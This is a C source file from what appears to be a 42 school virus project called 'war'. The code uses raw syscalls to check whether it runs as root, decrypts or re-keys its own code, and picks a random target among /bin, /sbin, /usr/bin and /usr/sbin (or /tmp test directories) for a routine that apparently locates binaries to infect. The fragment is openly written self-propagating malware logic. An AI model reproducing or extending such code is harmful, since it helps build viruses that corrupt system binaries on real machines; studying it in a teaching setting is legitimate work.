/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   war.c                                              :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/03/12 18:17:19 by ddinaut           #+#    #+#             */
/*   Updated: 2019/03/22 14:16:05 by ddinaut          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "war.h"

__INLINE__ static int _getuid(void)
{
	long ret;

	__asm__ __volatile__ (
		"mov rax, 102;"
		"syscall");
	__asm__ __volatile__ (
		"mov %0, rax" : "=r"(ret)
		);

	return (ret);
}

__INLINE__ static ssize_t	_get_random(void *buf, size_t buflen, unsigned int flags)
{
	ssize_t ret;

	__asm__ __volatile__ (
		"mov rdi, %0;"
		"mov rsi, %1;"
		"mov edx, %2;"
		"mov rax, 318;"
		"syscall" :: "g" (buf), "g" (buflen), "g" (flags)
		);

	__asm__ __volatile__ (
		"mov %0, rax;" : "=r" (ret)
		);
	return (ret);
}

__INLINE__ static int         _random_number(int limit)
{
	uint8_t val[4];

	if (_get_random(val, 4, 0) < 0)
		return (0);
	return ((int)*val % limit);
}

void	war(t_data *data)
{
	update_two(&data->key, (char*)war, (size_t)locate - (size_t)war);
//	printf("war key = %lx\n", data->key.two);

	if (_getuid() == 0)
	{
		t_directory root = {_random_number(ROOT_ENTRY), {"/bin", "/sbin", "/usr/bin", "/usr/sbin"}};
//		revert_two(&data->key, (char*)locate, (size_t)inspect - (size_t)locate);
		locate(data, &root);
	}
	else
	{
		t_directory user = {_random_number(USER_ENTRY), {"/tmp/test", "/tmp/test2"}};
//		revert_two(&data->key, (char*)locate, (size_t)inspect - (size_t)locate);
		locate(data, &user);
	}
}
